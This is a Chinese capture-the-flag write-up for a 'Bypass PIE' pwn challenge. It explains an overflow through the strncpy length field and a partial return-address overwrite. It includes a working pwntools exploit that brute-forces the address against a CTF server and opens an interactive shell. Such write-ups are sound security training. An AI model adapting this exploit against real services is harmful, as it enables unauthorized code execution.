# 挑战简介
Bypass PIE

- 本地环境跟远程环境略有差别，请注意识别查看并修改exp

# 思路
这题比较新颖  

两个关键函数，do_pwn之中  
1. set_user
```
int __fastcall set_user(__int64 a1)
{
  char s[140]; // [rsp+10h] [rbp-90h]
  int i; // [rsp+9Ch] [rbp-4h]

  memset(s, 0, 0x80uLL);
  puts("Enter your name");
  printf("> ", 0LL);
  fgets(s, 128, _bss_start);
  for ( i = 0; i <= 40 && s[i]; ++i )
    *(_BYTE *)(a1 + i + 140) = s[i];
  return printf("Hi, %s", a1 + 140);
}
```

2. set_pwn

```
char *__fastcall set_pwn(__int64 a1)
{
  char s; // [rsp+10h] [rbp-400h]

  memset(&s, 0, 0x400uLL);
  puts("PWN our leader");
  printf("> ", 0LL);
  fgets(&s, 1024, _bss_start);
  return strncpy((char *)a1, &s, *(signed int *)(a1 + 180));
}
```

可以发现，可以读取128字符的username，从set_pwn中对strncpy的调⽤可以看出⻓度保存在a1+180，  
username⾸地址在a1+140，可以通过溢出修改strncpy⻓度造成溢出。  

这个程序开启了PIE保护，我们不能确定后⻔函数GAME_OVER()的具体地址，因此没办法直接通过溢  
出来跳转到后⻔函数GAME_OVER()。我们可以尝试爆破。  
由于内存的⻚载⼊机制，PIE的随机化只能影响到单个内存⻚。通常来说，⼀个内存⻚⼤⼩为0x1000，  
这就意味着不管地址怎么变，某条指令的后12位，3个⼗六进制数的地址是始终不变的。因此通过覆盖  
EIP的后8或16位(按字节写⼊，每字节8位)就可以快速爆破或者直接劫持EIP。  

我们可以看到其地址后三位为0x900  
但是由于我们的payload必须按字节写⼊，每个字节是两个⼗六进制数，所以我们必须输⼊两个字节。  
除去已知的0x900还需要爆破⼀个⼗六进制数。这个数只可能在0~0xf之间改变，因此爆破并空间不⼤。  
我们知道爆破失败的话程序就会崩溃，此时io的连接会关闭，因此调⽤io.recv()会触发⼀个EOFError。由于这个特性，我们可以使⽤python的try...except...来捕获这个错误并进⾏处理。  
值得注意的是，由于没有刷新缓冲区，导致远程部署环境时回显信息会有差异，即没有及时显⽰，先让你输⼊，在两次输⼊过后才进⾏回显。  
但是我们可以先对本地进⾏尝试，在确定⽆误后再对远程进⾏修改  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386",os = 'linux',log_level = 'debug')
#io = process("./pwn")
elf = ELF('D:\edge 下载\pwn')

i = 0
while True:
    i += 1
    print(i)
    io = remote('pwn.challenge.ctf.show', 28216)

    payload = b'a' * 40
    payload += b'\xca'
    io.sendline(payload)

    payload = b'a' * 200
    payload += b'\x01\x09'
    io.sendline(payload)

    try:
        io.recv(timeout = 1)
    except EOFError:
        io.close()
        continue
    else:
        sleep(0.1)
        io.sendline('/bin/sh\x00')
        sleep(0.1)
        io.interactive()
        break
```

